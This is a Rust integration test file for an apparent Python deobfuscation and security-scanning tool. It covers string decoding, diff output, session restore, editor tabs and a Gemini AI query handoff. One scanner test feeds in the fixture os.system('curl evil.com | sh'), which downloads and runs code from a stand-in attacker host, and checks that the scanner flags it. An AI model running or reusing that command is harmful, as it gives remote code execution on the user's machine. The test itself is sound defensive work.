use crate::common::*;
use crate::core::pipeline::{DeobfuscationConfig, DeobfuscatorEngine};
use crate::core::security::SecurityScanner;
use std::sync::mpsc;
use std::thread;

// =========================================================================
// Tier 3: Pairwise Cross-Feature Integration Tests
// =========================================================================

#[test]
fn test_t3_1_deobfuscator_and_ai_explain_handoff() {
    let config = DeobfuscationConfig::default();
    let obfuscated = "import base64\npayload = base64.b64decode('cHJpbnQoJ2hlbGxvJyk=').decode()";
    let res = DeobfuscatorEngine::process(obfuscated, &config);

    // Handoff to AI query
    let req = AiQueryRequest {
        prompt: "Explain this transformed code".to_string(),
        model: MODEL_GEMINI_3_1_FLASH_LITE.to_string(),
        context_code: res.raw_transformed.clone(),
        action: AiAction::ExplainCode,
        api_key: "TEST_KEY".to_string(),
    };

    assert_eq!(req.action, AiAction::ExplainCode);
    assert!(!req.context_code.is_empty());
    assert_eq!(req.context_code, res.raw_transformed);
}

#[test]
fn test_t3_2_deobfuscator_and_diff_viewer_generation() {
    let config = DeobfuscationConfig::default();
    let original = "msg = bytes.fromhex('6b726f6e6f73').decode()";
    let res = DeobfuscatorEngine::process(original, &config);

    let diff = compute_simple_diff(original, &res.raw_transformed);
    assert!(!diff.is_empty());
    assert!(diff.iter().any(|d| d.diff_type == DiffLineType::Modified));
}

#[test]
fn test_t3_3_session_persistence_and_tab_lifecycle() {
    let mut session = SessionState::default();
    session.open_tabs = vec![
        EditorTabItem { id: 0, title: "file_a.py".to_string(), tab_type: 0, dot_color: "#FFF".to_string() },
        EditorTabItem { id: 1, title: "file_b.py".to_string(), tab_type: 0, dot_color: "#FFF".to_string() },
        EditorTabItem { id: 2, title: "file_c.py".to_string(), tab_type: 0, dot_color: "#FFF".to_string() },
    ];
    session.active_tab_index = 1;

    // Simulate closing active tab 1 (file_b.py) -> adjacent focus shifts to index 1 (file_c.py)
    session.open_tabs.remove(1);
    session.active_tab_index = 1;

    // Persist session to JSON
    let json_str = serde_json::to_string(&session).unwrap();

    // Restore session
    let restored: SessionState = serde_json::from_str(&json_str).unwrap();
    assert_eq!(restored.open_tabs.len(), 2);
    assert_eq!(restored.active_tab_index, 1);
    assert_eq!(restored.open_tabs[restored.active_tab_index as usize].title, "file_c.py");
}

#[test]
fn test_t3_4_activity_bar_and_context_panel_synchronization() {
    let mut active_activity_tab = 0; // Explorer
    assert_eq!(active_activity_tab, 0);
    let mut context_panel_title = "EXPLORER";
    assert_eq!(context_panel_title, "EXPLORER");
    let mut context_panel_width = 260;
    let mut is_collapsed = false;
    assert!(!is_collapsed);

    // 1. Switch to AST Explorer (Tab 2)
    active_activity_tab = 2;
    context_panel_title = "AST EXPLORER";
    assert_eq!(active_activity_tab, 2);
    assert_eq!(context_panel_title, "AST EXPLORER");

    // 2. Click active Tab 2 again -> Toggles collapse
    is_collapsed = true;
    let displayed_width = if is_collapsed { 0 } else { context_panel_width };
    assert_eq!(displayed_width, 0);

    // 3. Click Tab 0 (Explorer) -> Expands and restores width
    active_activity_tab = 0;
    assert_eq!(active_activity_tab, 0);
    context_panel_title = "EXPLORER";
    is_collapsed = false;
    context_panel_width = 280;
    let final_width = if is_collapsed { 0 } else { context_panel_width };
    assert_eq!(final_width, 280);
    assert_eq!(context_panel_title, "EXPLORER");
}

#[test]
fn test_t3_5_ast_explorer_and_syntax_highlighting() {
    let sample = "import os\ndef get_system():\n    return os.name";
    let line_numbers = build_line_numbers_text(sample);
    let line_count = sample.lines().count();
    let num_count = line_numbers.lines().count();
    assert_eq!(line_count, num_count);
    assert_eq!(line_numbers, "1\n2\n3");
}

#[test]
fn test_t3_6_security_scanner_and_history_logging() {
    let dangerous_code = "import os\nos.system('curl evil.com | sh')";
    let audit = SecurityScanner::audit(dangerous_code, dangerous_code);

    let history_entry = HistoryRecord {
        id: 1001,
        timestamp: 1700000000,
        filename: "malware.py".to_string(),
        original_code: dangerous_code.to_string(),
        transformed_code: dangerous_code.to_string(),
        alerts_count: audit.alerts_count,
        diff_lines_changed: 0,
        execution_ms: 15,
    };

    assert!(!audit.is_safe);
    assert!(history_entry.alerts_count > 0);
    let serialized = serde_json::to_string(&history_entry).unwrap();
    let restored: HistoryRecord = serde_json::from_str(&serialized).unwrap();
    assert_eq!(restored.alerts_count, audit.alerts_count);
}

#[test]
fn test_t3_7_command_palette_and_pipeline_execution() {
    let command_selected = "Run AST Deobfuscation";
    let is_deob = command_selected == "Run AST Deobfuscation";
    assert!(is_deob);

    let config = DeobfuscationConfig::default();
    let res = DeobfuscatorEngine::process("x = 10", &config);
    assert!(!res.code.is_empty());
}

#[test]
fn test_t3_8_ai_suggest_reconstruction_and_editor_tab_replacement() {
    let ai_response_markdown = "Here is the cleaned idiomatic code:\n```python\ndef get_user_id():\n    return 42\n```\nExplanation follows.";
    let extracted = crate::core::ai_chat::extract_code_block(ai_response_markdown);
    assert!(extracted.is_some());

    let mut editor_tab_buffer = "# Obfuscated code\n_0x1 = lambda: 42".to_string();
    if let Some(clean_code) = extracted {
        editor_tab_buffer = clean_code;
    }

    assert_eq!(editor_tab_buffer, "def get_user_id():\n    return 42");
}

#[test]
fn test_t3_9_workspace_explorer_and_multi_tab_opening() {
    let ws = TempWorkspace::new("t3_ws_tabs");
    ws.write_file("module_a.py", "def a(): pass");
    ws.write_file("module_b.py", "def b(): pass");
    ws.write_file("module_c.py", "def c(): pass");

    let items = scan_folder_recursive(&ws.root);
    assert_eq!(items.len(), 3);

    let mut open_tabs: Vec<EditorTabItem> = Vec::new();
    for (idx, item) in items.iter().enumerate() {
        open_tabs.push(EditorTabItem {
            id: idx as i32,
            title: item.name.clone(),
            tab_type: 0,
            dot_color: "#FFF".to_string(),
        });
    }

    assert_eq!(open_tabs.len(), 3);
    assert_eq!(open_tabs[0].title, "module_a.py");
    assert_eq!(open_tabs[1].title, "module_b.py");
    assert_eq!(open_tabs[2].title, "module_c.py");
}

#[test]
fn test_t3_10_theme_colors_and_diff_highlighting() {
    let diff_modified_color = THEME_PRIMARY_ACCENT; // Crimson accent
    let diff_border_color = THEME_BORDERS;           // Subtle border
    let diff_bg_color = THEME_EDITOR_BG;            // Dark background

    assert_eq!(diff_modified_color, "#D9283D");
    assert_eq!(diff_border_color, "#26262B");
    assert_eq!(diff_bg_color, "#0D0D10");
}

#[test]
fn test_t3_11_async_worker_and_ai_panel_busy_state() {
    let (tx_req, rx_req) = mpsc::channel();
    let (tx_resp, rx_resp) = mpsc::channel();

    thread::spawn(move || {
        while let Ok(prompt) = rx_req.recv() {
            let reply = format!("AI response for: {}", prompt);
            tx_resp.send(reply).unwrap();
        }
    });

    let mut ai_busy = false;
    assert!(!ai_busy);

    // Send query
    ai_busy = true;
    assert!(ai_busy);
    tx_req.send("Analyze threat").unwrap();

    // Await response
    let reply = rx_resp.recv().unwrap();
    ai_busy = false;

    assert!(!ai_busy);
    assert!(reply.contains("Analyze threat"));
}

#[test]
fn test_t3_12_model_selector_and_gemini_rest_client() {
    let selected_model = MODEL_GEMINI_3_8_FLASH;
    let api_key = "MY_KEY";
    let endpoint = format!(
        "{}/{}:generateContent?key={}",
        GEMINI_API_ENDPOINT_BASE, selected_model, api_key
    );

    assert!(endpoint.contains("gemini-3.8-flash"));
    assert!(endpoint.contains("key=MY_KEY"));
}

#[test]
fn test_t3_13_deobfuscator_selective_options_and_pipeline_config() {
    let sample = "msg = base64.b64decode('aGVsbG8=')";

    // Pass 1: decoders disabled
    let mut config = DeobfuscationConfig::default();
    config.static_decoders = false;
    let res1 = DeobfuscatorEngine::process(sample, &config);
    assert_eq!(res1.strings_decoded, 0);

    // Pass 2: decoders enabled
    config.static_decoders = true;
    let res2 = DeobfuscatorEngine::process(sample, &config);
    assert!(res2.strings_decoded > 0 || res2.raw_transformed.contains("hello"));
}

#[test]
fn test_t3_14_empty_state_and_file_open_transition() {
    let mut open_tabs: Vec<EditorTabItem> = Vec::new();
    let mut active_tab = -1;
    let mut has_open_file = false;

    assert!(open_tabs.is_empty());
    assert_eq!(active_tab, -1);
    assert!(!has_open_file);

    // User opens file
    open_tabs.push(EditorTabItem {
        id: 0,
        title: "test.py".to_string(),
        tab_type: 0,
        dot_color: "#FFF".to_string(),
    });
    active_tab = 0;
    has_open_file = true;

    assert_eq!(open_tabs.len(), 1);
    assert_eq!(active_tab, 0);
    assert!(has_open_file);
}

#[test]
fn test_t3_15_history_log_replay_to_diff_viewer() {
    let record = HistoryRecord {
        id: 1,
        timestamp: 1000,
        filename: "script.py".to_string(),
        original_code: "raw = 1\nraw = 2".to_string(),
        transformed_code: "raw = 1\nclean = 2".to_string(),
        alerts_count: 0,
        diff_lines_changed: 1,
        execution_ms: 10,
    };

    let diff = compute_simple_diff(&record.original_code, &record.transformed_code);
    assert_eq!(diff.len(), 2);
    assert_eq!(diff[0].diff_type, DiffLineType::Unmodified);
    assert_eq!(diff[1].diff_type, DiffLineType::Modified);
}
